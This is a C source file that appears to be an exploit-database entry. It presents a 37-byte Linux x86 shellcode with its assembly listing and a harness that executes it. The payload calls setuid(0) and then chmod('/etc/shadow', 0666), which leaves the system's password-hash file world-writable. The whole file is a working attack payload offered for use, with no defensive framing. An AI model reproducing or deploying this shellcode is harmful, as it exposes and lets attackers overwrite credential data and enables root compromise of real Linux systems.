/*
 * Title: linux/x86 setuid(0) + chmod("/etc/shadow", 0666) Shellcode 37 Bytes
 * Type: Shellcode
 * Author: antrhacks
 * Platform: Linux X86
*/

/* ASSembly
 31 db                	xor    %ebx,%ebx
 b0 17                	mov    $0x17,%al
 cd 80                	int    $0x80
 31 c0                	xor    %eax,%eax
 50                   	push   %eax
 68 61 64 6f 77       	push   $0x776f6461
 68 63 2f 73 68       	push   $0x68732f63
 68 2f 2f 65 74       	push   $0x74652f2f
 89 e3                	mov    %esp,%ebx
 66 b9 b6 01          	mov    $0x1b6,%cx
 b0 0f                	mov    $0xf,%al
 cd 80                	int    $0x80
 40                   	inc    %eax
 cd 80                	int    $0x80
*/

int main(){
 char shell[] = "\x31\xdb\xb0\x17\xcd\x80\x31\xc0\x50"
"\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68"
"\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01"
"\xb0\x0f\xcd\x80\x40\xcd\x80";

 printf("[*] Taille du ShellCode = %d\n", strlen(shell));
 (*(void (*)()) shell)();

 return 0;
}